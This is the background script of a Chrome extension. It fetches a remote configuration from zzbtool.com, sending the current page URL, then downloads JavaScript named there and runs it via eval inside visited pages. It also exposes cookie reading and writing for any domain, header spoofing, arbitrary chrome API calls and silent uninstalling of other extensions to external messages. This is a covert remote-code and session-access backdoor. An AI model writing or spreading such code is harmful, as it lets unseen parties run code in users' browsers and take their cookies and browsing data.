function Lister$9(request, sender, sendResponse) {
  var world = "MAIN";
  if (request.world) world = request.world;
  if (request.type == 2) {
    var data = {
      world,
      files: request.fileNames
    };
    data = fillIframeIdToData$1(request, sender, data);
    console.log("执行加载某个js，文件", data);
    chrome.scripting.executeScript(data).then((a) => {
      sendResponse(a);
    });
    return;
  }
  var args = [request.params];
  if (request.args) args = request.args;
  var data = {
    function: injectScript,
    args,
    world
  };
  data = fillIframeIdToData$1(request, sender, data);
  chrome.scripting.executeScript(data).then((a) => {
    sendResponse(a);
  });
}
function injectScript(params) {
  if (!params) return;
  if (params.type == "eval") {
    return eval(params.value);
  }
}
function fillIframeIdToData$1(request, sender, data) {
  var myIframeId = request.myIframeId;
  if (!myIframeId && sender.frameId) myIframeId = sender.frameId;
  var myIframeIds = null;
  if (myIframeId) myIframeIds = [myIframeId];
  var tabId = request.tabId;
  if (!tabId) tabId = sender.tab.id;
  data.target = { tabId };
  if (myIframeIds) {
    data.target.frameIds = myIframeIds;
  }
  if (request.execteTarget) data.target = request.execteTarget;
  return data;
}
const inject = { Lister: Lister$9 };
var headerPre = `zzb-header-`;
function RegOne(t, re) {
  if (!t) return false;
  var arr = re.exec(t);
  if (arr && arr.length > 1) {
    return arr[1];
  }
  return false;
}
async function UpdateRules(request) {
  var myHeaders = request.headers || request.header;
  var resultHeaders = {};
  var isNeedUpdateHeader = false;
  var urlFilter = "";
  if (request.url) urlFilter = RegOne(request.url, /\/\/([^\/]+)/);
  var headerParams = [];
  for (var key in myHeaders) {
    var value2 = myHeaders[key];
    key = String(key).toLowerCase();
    if (!key.includes(headerPre)) {
      resultHeaders[key] = value2;
      continue;
    }
    isNeedUpdateHeader = true;
    var myKey = key.replace(headerPre, "");
    headerParams.push({ "header": myKey, "operation": "set", "value": value2 });
  }
  if (!isNeedUpdateHeader) return resultHeaders;
  var requestHeaders = [
    // {
    //   header: "name",
    //   operation: "set",
    //   value: "service-worker7",
    // },
  ];
  var resourceTypes = ["xmlhttprequest"];
  var condition = {
    urlFilter,
    resourceTypes
  };
  headerParams.map((newParam) => {
    requestHeaders.push(newParam);
  });
  if (request.requestHeaders) requestHeaders = request.requestHeaders;
  if (request.condition) condition = request.condition;
  var addRules = [
    {
      id: 14,
      priority: 1,
      action: {
        type: "modifyHeaders",
        requestHeaders
      },
      condition
    }
  ];
  var removeRuleIds = [14];
  if (request.addRules && request.addRules.length > 0) addRules = request.addRules;
  if (request.removeRuleIds && request.removeRuleIds.length > 0) removeRuleIds = request.removeRuleIds;
  await chrome.declarativeNetRequest.updateSessionRules({
    removeRuleIds,
    addRules
  });
  return resultHeaders;
}
async function ClearRules() {
  var addRules = [{ "action": { "requestHeaders": [{ "header": "referer", "operation": "set", "value": "https://aaabg.com" }, { "header": "origin", "operation": "set", "value": "https://aaabg.com" }], "type": "modifyHeaders" }, "condition": { "resourceTypes": ["ping"], "urlFilter": "aaabg.com" }, "id": 999, "priority": 1 }];
  await chrome.declarativeNetRequest.updateSessionRules({
    removeRuleIds: [14, 999],
    addRules
  });
}
async function Lister$8(request, sender, sendResponse) {
  await UpdateRules(request);
  sendResponse("");
}
const http_rule = { UpdateRules, Lister: Lister$8, ClearRules };
async function Lister$7(request, sender, sendResponse) {
  console.log("开始进行 fetch的加载");
  var headers = await http_rule.UpdateRules(request);
  var fetchParams = { headers };
  if (request.method) fetchParams.method = request.method;
  if (request.data) fetchParams.body = request.data;
  if (request.fetchParams) fetchParams = request.fetchParams;
  if (request.type && request.type.toLowerCase() == "base64") {
    return GetBase64(request.url, sendResponse);
  }
  fetch(request.url, fetchParams).then(async (response) => {
    if (response.ok) {
      if (request.textDecoderType) {
        const decoder = new TextDecoder(request.textDecoderType);
        var bb = await response.arrayBuffer();
        const gbkText = decoder.decode(new Uint8Array(bb));
        return gbkText;
      }
      return response.text();
    } else {
      throw await response.text();
    }
  }).then((content) => {
    let newContent = null;
    try {
      newContent = JSON.parse(content);
    } catch (error) {
      console.log(error);
    }
    var t = { result: newContent || content, resultContent: content, success: true };
    if (request.isNotNeedClearRules) return sendResponse(t);
    http_rule.ClearRules().then(() => {
      sendResponse(t);
    });
  }).catch((error) => {
    var t = { result: error, success: false };
    if (request.isNotNeedClearRules) return sendResponse(t);
    http_rule.ClearRules().then(() => {
      sendResponse(t);
    });
  });
}
function GetBase64(imageUrl, sendResponse) {
  fetch(imageUrl).then((respone) => respone.blob()).then((r) => {
    var reader = new FileReader();
    if (r.type) r.type;
    reader.onload = /* @__PURE__ */ function() {
      return function(e) {
        sendResponse(e.currentTarget.result);
      };
    }();
    reader.readAsDataURL(r);
  }).catch(function(err) {
    console.log(err);
  });
}
const fetch$1 = { Lister: Lister$7 };
function Lister$6(request, sender, sendResponse) {
  var baseObj = null;
  baseObj = chrome[request.objKey];
  if (request.objKey2) baseObj = baseObj[request.objKey2];
  if (request.objKey3) baseObj = baseObj[request.objKey3];
  if (request.objKey4) baseObj = baseObj[request.objKey4];
  var myFunc = null;
  if (request.funcName) {
    myFunc = baseObj[request.funcName];
  } else {
    myFunc = baseObj;
  }
  var callBack = (e) => {
    console.log(e);
    sendResponse && sendResponse(e);
  };
  if (!request.isMastCallBack) request.params = request.params.concat(callBack);
  var result = myFunc.apply(request.obj, request.params);
  console.log(result);
  console.log(baseObj);
  if (request.isMastCallBack) {
    if (request.isReturnPromise) {
      result.then((r1, r2, r3) => {
        sendResponse && sendResponse(r1, r2, r3);
      });
    } else {
      sendResponse && sendResponse(result);
    }
  }
}
const zzb_apply = { Lister: Lister$6 };
async function SendMessageToContentScript(message) {
  var tabId = await getCurrentTabId();
  if (!tabId) return console.log("没有找到tabId，无法发送消息到content里");
  chrome.tabs.sendMessage(tabId, message);
}
async function getCurrentTabId() {
  var tabs = await chrome.tabs.query({ active: true, currentWindow: true });
  return tabs.length ? tabs[0].id : null;
}
const send_message_to_content = { SendMessageToContentScript };
async function removeCookie(request, sender, sendResponse) {
  if (request.name) {
    console.log(request.name);
    chrome.cookies.remove({
      url: request.url,
      name: request.name
    }, sendResponse);
  } else if (request.names) {
    request.names.forEach((name) => {
      console.log(name);
      chrome.cookies.remove({
        url: request.url,
        name
      });
    });
  } else if (request.removeInfos) {
    request.removeInfos.forEach((removeInfo) => {
      chrome.cookies.remove(removeInfo);
    });
  }
  sendResponse();
  return;
}
function setCookies(request, sender, sendResponse) {
  let domainUrl = (request == null ? void 0 : request.domainUrl) || "";
  let cookieData = request.cookieData;
  if (!request.secure) request.secure = false;
  if (!request.httpOnly) request.httpOnly = false;
  for (var key in cookieData) {
    let v = cookieData[key];
    console.log("开始设置cookie.key=" + key + "|v=" + v);
    var detail = v.detail;
    if (!detail) detail = {
      "url": domainUrl,
      "name": key,
      "value": v,
      "secure": request.secure,
      "httpOnly": request.httpOnly
    };
    if (request.domain) detail.domain = request.domain;
    chrome.cookies.set(detail, (a) => {
      console.log("chrome.cookies", a);
    });
  }
  sendResponse();
  return;
}
async function Lister$5(request, sender, sendResponse) {
  if (request.cmd == "removeCookie") return removeCookie(request, sender, sendResponse);
  if (request.cmd == "setCookies") return setCookies(request, sender, sendResponse);
  var cookies = await chrome.cookies.getAll({ "domain": request.myDomain });
  var newCookies = [];
  var cookiesStr = "";
  for (var i = 0; i < cookies.length; i++) {
    var cookie1 = cookies[i];
    var cookie2 = { name: cookie1["name"], value: cookie1["value"] };
    newCookies[newCookies.length] = cookie2;
    cookiesStr = cookiesStr + cookie2["name"] + "=" + cookie2["value"];
    if (i < cookies.length - 1) cookiesStr = cookiesStr + ";";
  }
  sendResponse && sendResponse({ cookies: newCookies, cookiesStr });
}
chrome.cookies.onChanged.addListener(function(a, b, c2) {
  var e = {};
  e.cmd = "cookie_change";
  e.type = 9001;
  e.data = a;
  send_message_to_content.SendMessageToContentScript(e);
});
const cookie = { Lister: Lister$5 };
async function Lister$4(request, sender, sendResponse) {
  request.dataType || (request.dataType = "html"), request.method || (request.method = "POST"), request.header || (request.header = {}), request.data || (request.data = {});
  let base64 = request.base64Img || await uploadImageGetBase64(request.fileUrl, request.loadType);
  let file = convertBase64UrlToFile(base64, request.fileName);
  var headers = await http_rule.UpdateRules(request);
  var fd = new FormData();
  fd.append(request.formFileName, file);
  for (var key in request.data) {
    fd.append(key, request.data[key]);
  }
  fetch(request.url, {
    method: request.method,
    headers,
    body: fd
  }).then(async (response) => {
    if (response.ok) {
      return response.text();
    } else {
      throw await response.text();
    }
  }).then((content) => {
    let newContent = null;
    try {
      newContent = JSON.parse(content);
    } catch (error) {
      console.log(error);
    }
    var t = { result: content, resultContent: newContent, success: true };
    sendResponse(t);
  }).catch((error) => {
    var t = { result: error, success: false };
    sendResponse(t);
  });
}
function uploadImageGetBase64(imageUrl, loadType) {
  loadType || (loadType = "image/jpeg");
  return new Promise((r1) => {
    fetch(imageUrl).then((respone) => respone.blob()).then((r) => {
      var reader = new FileReader();
      if (r.type) loadType = r.type;
      reader.onload = /* @__PURE__ */ function() {
        return function(e) {
          var base64Data1 = {
            dataURL: e.currentTarget.result,
            type: loadType
          };
          r1(base64Data1);
        };
      }();
      reader.readAsDataURL(r);
    }).catch(function(err) {
      console.log(err);
    });
  });
}
function convertBase64UrlToFile(base64, picName) {
  if (!picName) picName = "test1.jpg";
  var urlData = base64.dataURL;
  var type = base64.type;
  let bytes = self.atob(urlData.split(",")[1]);
  var ab = new ArrayBuffer(bytes.length);
  var ia = new Uint8Array(ab);
  for (var i = 0; i < bytes.length; i++) {
    ia[i] = bytes.charCodeAt(i);
  }
  return new File([ab], picName, {
    type
  });
}
const update_file = { Lister: Lister$4 };
function GetConfigUrl() {
  var index = (/* @__PURE__ */ new Date()).getTime() % 100;
  var baseUrl = `https://plug${index}.zzbtool.com`;
  var url = `${baseUrl}/zzbPlug/v3config`;
  return url;
}
async function checkHasSubUrl(z_currentUrl) {
  var has = false;
  try {
    var r = await chrome.storage.local.get(["enable_sub_urls"]);
    r.enable_sub_urls.urls.map((u) => {
      if (!has) has = z_currentUrl.includes(u);
    });
    console.log(`这个子iframe${z_currentUrl}不在名单里:${JSON.stringify(r.enable_sub_urls.urls)}`);
  } catch (error) {
    console.log(`这个子iframe 出错了，${z_currentUrl}，err=${error}`);
  }
  return has;
}
async function GetConfig(request, sender, sendResponse) {
  var z_currentUrl = sender.url;
  request.isSub = sender.frameId && sender.frameId > 0;
  if (request.isSub) {
    if (!z_currentUrl) return;
    var hasSubUrl = await checkHasSubUrl(z_currentUrl);
    if (!hasSubUrl) return;
  }
  const m = chrome.runtime.getManifest();
  var authorName = m.author_name;
  if (!authorName && m.authorName) authorName = m.authorName;
  if (!authorName) authorName = "";
  var channel = m.channel;
  if (!channel) channel = "";
  var headers = { "z_channel": channel, "z_crxid": chrome.runtime.id, "z_v": m.version, "z_authorname": authorName };
  if (request.isOnlineConfig) {
    headers["z_isOnlineConfig"] = 1;
  }
  if (request.isDevConfig) {
    headers["z_isdevconfig"] = 1;
  }
  if (request.isSub) headers["z_issub"] = request.isSub;
  headers["z_current"] = z_currentUrl;
  var response = await fetch(GetConfigUrl(), { headers });
  var config = await response.json();
  config = config.result;
  if (sendResponse) sendResponse(config);
  return config;
}
async function Lister$3(request, sender, sendResponse) {
  console.log("开始启动后端了");
  var config = await GetConfig(request, sender, sendResponse);
  if (!config || !config.jsUrls) return;
  await requestLocalExecuteScript(config, request, sender);
  await requestLocalExecuteCss(config, request, sender);
  for (var i = 0; i < config.cssUrls.length; i++) {
    var cssUrl = config.cssUrls[i];
    await executeCss(cssUrl, config, request, sender);
  }
  for (var i = 0; i < config.jsUrls.length; i++) {
    var jsUrl = config.jsUrls[i];
    await executeScript(jsUrl, config, request, sender);
  }
}
async function requestLocalExecuteScript(config, request, sender, sendResponse) {
  var fileNames = [
    "other/jquery-1.8.3.js",
    "other/base64.js",
    "other/md5.js",
    "other/layer.js",
    "other/layui.all.js",
    "other/clipboard.min.js",
    "other/crypto-js.min.js",
    "other/FileSaver.js",
    "other/html2canvas.min.js",
    "other/jquery.qrcode.min.js",
    "other/jquery.hotkeys.min.js",
    "other/jsencrypt.min.js",
    "other/jszip-utils.js",
    "other/jszip.min.js"
  ];
  if (config.requestLocalExecuteJs) fileNames = config.requestLocalExecuteJs;
  var world = "MAIN";
  if (config.world) world = config.world;
  var data = {
    world,
    files: fileNames
  };
  data = fillIframeIdToData(request, sender, data);
  return chrome.scripting.executeScript(data);
}
async function requestLocalExecuteCss(config, request, sender, sendResponse) {
  var fileNames = ["css/other/layui.css", "css/font-awesome.min.css", "css/index.css"];
  if (config.requestLocalExecuteCss) fileNames = config.requestLocalExecuteCss;
  var data = {
    files: fileNames
  };
  data = fillIframeIdToData(request, sender, data);
  return chrome.scripting.insertCSS(data);
}
var myExeCodeMap = {};
async function executeScript(jsUrl, config, request, sender, sendResponse) {
  var myKey = `js_${jsUrl}`;
  var code = myExeCodeMap[myKey];
  if (!code) {
    code = await fetchData(jsUrl);
    if (code) myExeCodeMap[myKey] = code;
  }
  if (!code) return;
  console.log("开始执行code");
  return executeScript2(code, config, request, sender);
}
async function executeScript2(code, config, request, sender, sendResponse) {
  var world = "MAIN";
  if (config.world) world = config.world;
  var args = [code];
  var data = {
    function: injectJsCode,
    args,
    world
  };
  data = fillIframeIdToData(request, sender, data);
  return chrome.scripting.executeScript(data);
}
function injectJsCode(value) {
  if (!value) return;
  eval(value);
}
async function fetchData(jsUrl) {
  return new Promise((r1, r2) => {
    fetch(jsUrl, {}).then((response) => {
      if (response.ok) {
        return response.text();
      } else {
        throw new Error(`请求失败，状态码: ${response.status}`);
      }
    }).then((content) => {
      r1(content);
    }).catch((error) => {
      console.error("出错了:", error);
      r2(error);
    });
  });
}
async function executeCss(cssUrl, config, request, sender, sendResponse) {
  var myKey = `css_${cssUrl}`;
  var code = myExeCodeMap[myKey];
  if (!code) {
    code = await fetchData(cssUrl);
    if (code) myExeCodeMap[myKey] = code;
  }
  if (!code) return;
  console.log("开始执行css code", code);
  return await executeCss2(code, config, request, sender);
}
function fillIframeIdToData(request, sender, data) {
  var myIframeId = request.myIframeId;
  if (!myIframeId && sender.frameId) myIframeId = sender.frameId;
  var myIframeIds = null;
  if (myIframeId) myIframeIds = [myIframeId];
  var tabId = request.tabId;
  if (!tabId) tabId = sender.tab.id;
  data.target = { tabId };
  if (myIframeIds) {
    data.target.frameIds = myIframeIds;
  }
  if (request.execteTarget) data.target = request.execteTarget;
  return data;
}
async function executeCss2(code, config, request, sender, sendResponse) {
  console.log(code);
  var value2 = `var style = document.createElement('style');
    style.innerHTML = \`${code}\`;
    document.head.appendChild(style);`;
  var world = "MAIN";
  if (config.world) world = config.world;
  var args = [value2];
  var data = {
    function: injectJsCode,
    args,
    world
  };
  data = fillIframeIdToData(request, sender, data);
  return chrome.scripting.executeScript(data);
}
const hot_code = { Lister: Lister$3, GetConfig };
async function Lister$2(request, sender, sendResponse) {
  var params2 = {
    url: request.url || request.srcUrl,
    saveAs: request.saveAs,
    filename: request.filename
  };
  if (request.params) params2 = request.params;
  var e = await chrome.downloads.download(params2);
  console.log(e);
  sendResponse && sendResponse(e);
}
const download = { Lister: Lister$2 };
async function Lister$1(request, sender, sendResponse) {
  if (request.cmd == "GetCacheData") {
    chrome.storage.local.get([request.key], (r) => {
      sendResponse(r[request.key], r);
    });
    return;
  }
  if (request.cmd == "SetCacheData") {
    var d = {};
    d[request.key] = request.value;
    chrome.storage.local.set(d, () => {
      sendResponse(true);
    });
    return;
  }
  if (request.cmd == "RemoveCacheData") {
    var d = [request.key];
    chrome.storage.local.remove(d);
    sendResponse();
    return;
  }
  if (request.cmd == "GetCacheSessionData") {
    chrome.storage.session.get([request.key], (r) => {
      sendResponse(r[request.key], r);
    });
    return;
  }
  if (request.cmd == "SetCacheSessionData") {
    var d = {};
    d[request.key] = request.value;
    chrome.storage.session.set(d, () => {
      sendResponse(true);
    });
    return;
  }
  if (request.cmd == "RemoveCacheSessionData") {
    var d = [request.key];
    chrome.storage.session.remove(d);
    sendResponse();
    return;
  }
}
const cache = { Lister: Lister$1 };
async function Lister(request, sender, sendResponse) {
  if (request.cmd == "uninstallCrx") {
    var r = await chrome.management.uninstall(request.id, { showConfirmDialog: false });
    sendResponse(r);
    return;
  }
  if (request.cmd == "setBadgeBackgroundColor") {
    chrome.browserAction.setBadgeBackgroundColor({ color: request.color });
    sendResponse();
    return;
  }
  if (request.cmd == "setBadgeText") {
    chrome.browserAction.setBadgeText({ text: request.text });
    sendResponse();
    return;
  }
  if (request.cmd == "setEnabledCrx") {
    chrome.management.setEnabled(request.id, request.isEnabled, (r2) => {
      sendResponse(r2);
    });
    return;
  }
  if (request.cmd == "removeWindow") {
    chrome.windows.remove(request.windowId, sendResponse);
    sendResponse();
    return;
  }
  if (request.cmd == "getAllCrx") {
    chrome.management.getAll((e) => {
      console.log(e);
      sendResponse(e);
    });
    return;
  }
  if (request.cmd == "uninstallCrx") {
    chrome.management.uninstall(request.id, {
      showConfirmDialog: false
    }, (r2) => {
      sendResponse(r2);
    });
    return;
  }
  if (request.cmd == "setEnabledCrx") {
    chrome.management.setEnabled(request.id, request.isEnabled, (r2) => {
      sendResponse(r2);
    });
    return;
  }
  if (request.cmd == "removeTab") {
    chrome.tabs.remove(request.tabId, sendResponse);
    sendResponse();
    return;
  }
  if (request.cmd == "getCurrentTab") {
    var tabs = await chrome.tabs.query({ active: true, currentWindow: true });
    var tab = tabs.length ? tabs[0] : null;
    var tabId = tab ? tab.id : null;
    sendResponse(tab, tabId);
    return;
  }
  if (request.cmd == "createTab") {
    chrome.tabs.create({ url: request.url }, function(tab2) {
      sendResponse("");
    });
    return;
  }
  if (request.cmd == "getAllCrx") {
    chrome.management.getAll((e) => {
      console.log(e);
      sendResponse(e);
    });
    return;
  }
  var responData = { name: "ok" };
  console.log("返回responData", responData);
  sendResponse(responData);
}
const other = { Lister };
function Bg_OnMessageLister(request, sender, sendResponse) {
  console.log("request", request);
  if (request.cmd == "zzb_apply") return zzb_apply.Lister(request, sender, sendResponse);
  if (request.cmd === "inject") return inject.Lister(request, sender, sendResponse);
  if (request.cmd === "start") return hot_code.Lister(request, sender, sendResponse);
  if (request.cmd === "getConfig") return hot_code.GetConfig(request, sender, sendResponse);
  if (request.cmd === "download") return download.Lister(request, sender, sendResponse);
  if (request.cmd === "download") return download.Lister(request, sender, sendResponse);
  if (request.cmd === "GetCacheData" || request.cmd === "SetCacheData" || request.cmd === "RemoveCacheData" || request.cmd === "GetCacheSessionData" || request.cmd === "SetCacheSessionData" || request.cmd === "RemoveCacheSessionData") return cache.Lister(request, sender, sendResponse);
  if (request.cmd === "fetch" || request.cmd === "ajax") return fetch$1.Lister(request, sender, sendResponse);
  if (request.cmd === "getCookies" || request.cmd == "removeCookie" || request.cmd == "setCookies") return cookie.Lister(request, sender, sendResponse);
  if (request.cmd === "uploadFile") return update_file.Lister(request, sender, sendResponse);
  if (request.cmd === "setBgData" || request.cmd === "updateRules") return http_rule.Lister(request, sender, sendResponse);
  if (request.cmd == "getManifest") {
    var m = chrome.runtime.getManifest();
    m.crxId = chrome.runtime.id;
    sendResponse(m);
    return;
  }
  if (request.cmd === "queryTab") {
    chrome.tabs.query(request.params).then((a) => {
      console.log("获取到的页面", a);
      sendResponse({ result: a, sender });
    }).catch((e) => {
      sendResponse({ result: e, sender });
    });
    return;
  }
  return other.Lister(request, sender, sendResponse);
}
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  console.log("chrome.runtime.onMessage.addListener");
  console.log(request);
  Bg_OnMessageLister(request, sender, sendResponse);
  return true;
});
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
  console.log("chrome.runtime.onMessageExternal.addListener", request, sender, sendResponse);
  Bg_OnMessageLister(request, sender, sendResponse);
  return true;
});
